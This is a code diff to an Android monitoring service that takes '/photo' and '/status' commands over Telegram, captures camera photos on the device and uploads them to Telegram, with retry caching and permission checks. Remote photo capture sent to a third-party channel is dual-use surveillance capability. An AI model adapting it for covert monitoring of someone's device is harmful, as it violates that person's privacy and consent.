@@ -23,6 +23,7 @@ import okhttp3.MultipartBody
 import okhttp3.RequestBody.Companion.asRequestBody
 import okhttp3.RequestBody.Companion.toRequestBody
 import java.io.File
+import java.util.concurrent.atomic.AtomicBoolean
 
 class MonitoringService : Service() {
 
@@ -33,6 +34,7 @@ class MonitoringService : Service() {
     private lateinit var cameraService: CameraService
     
     private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
+    private val cameraBusy = AtomicBoolean(false)
     private var monitoringJob: Job? = null
     private var cameraJob: Job? = null
     private var commandJob: Job? = null
@@ -101,7 +103,7 @@ class MonitoringService : Service() {
             startForeground(
                 NOTIFICATION_ID,
                 notificationBuilder.build(),
-                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
+                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
             )
         } else {
             startForeground(NOTIFICATION_ID, notificationBuilder.build())
@@ -200,7 +202,7 @@ class MonitoringService : Service() {
         when (command) {
             "/photo" -> {
                 sendToTelegram("📸 Taking photo now…")
-                captureAndSendPhoto()
+                captureAndSendPhoto(reportResult = true)
             }
             "/status" -> {
                 val lastSync = preferencesManager.lastSyncTime
@@ -520,26 +522,68 @@ class MonitoringService : Service() {
     // CAMERA MONITORING FUNCTIONS
     // ═══════════════════════════════════════════════════════════
     
-    private suspend fun captureAndSendPhoto() {
-        withContext(Dispatchers.Main) {
-            try {
-                android.util.Log.i("MonitoringService", "📸 Starting camera capture...")
-                
-                cameraService.capturePhoto(
-                    onPhotoTaken = { photoFile ->
-                        serviceScope.launch {
-                            sendPhotoToTelegram(photoFile)
+    private fun captureAndSendPhoto(reportResult: Boolean = false) {
+        if (!hasCameraPermission()) {
+            serviceScope.launch {
+                if (reportResult) {
+                    sendToTelegram("⚠️ Photo capture failed: camera permission missing. Open Setup and grant Camera permission.")
+                } else {
+                    notifyCameraFailure("camera permission missing")
+                }
+            }
+            return
+        }
+        if (!cameraBusy.compareAndSet(false, true)) {
+            if (reportResult) {
+                serviceScope.launch {
+                    sendToTelegram("⚠️ Camera is busy, please try /photo again in a moment.")
+                }
+            }
+            return
+        }
+        try {
+            android.util.Log.i("MonitoringService", "📸 Starting camera capture...")
+            cameraService.capturePhoto(
+                onPhotoTaken = { photoFile ->
+                    cameraBusy.set(false)
+                    serviceScope.launch {
+                        val sent = sendPhotoFile(photoFile)
+                        if (sent) {
+                            flushPendingPhotos()
+                        } else {
+                            prunePhotoCache()
+                            if (reportResult) {
+                                sendToTelegram("⚠️ Photo captured but upload failed. File kept for retry.")
+                            }
                         }
-                    },
-                    onError = { exception ->
-                        android.util.Log.e("MonitoringService", "✗ Camera capture failed: ${exception.message}")
-                        serviceScope.launch {
+                    }
+                },
+                onError = { exception ->
+                    cameraBusy.set(false)
+                    android.util.Log.e("MonitoringService", "✗ Camera capture failed: ${exception.message}")
+                    serviceScope.launch {
+                        if (reportResult) {
+                            val hint = if (!hasCameraPermission()) {
+                                "Open Setup and grant Camera permission."
+                            } else {
+                                "The camera may be in use by another app."
+                            }
+                            sendToTelegram("⚠️ Photo capture failed: ${exception.message ?: "unknown error"}. $hint")
+                        } else {
                             notifyCameraFailure(exception.message ?: "unknown error")
                         }
                     }
-                )
-            } catch (e: Exception) {
-                android.util.Log.e("MonitoringService", "✗ Error in captureAndSendPhoto", e)
+                }
+            )
+        } catch (e: Exception) {
+            cameraBusy.set(false)
+            android.util.Log.e("MonitoringService", "✗ Error in captureAndSendPhoto", e)
+            serviceScope.launch {
+                if (reportResult) {
+                    sendToTelegram("⚠️ Photo capture failed: ${e.message ?: "unknown error"}.")
+                } else {
+                    notifyCameraFailure(e.message ?: "unknown error")
+                }
             }
         }
     }
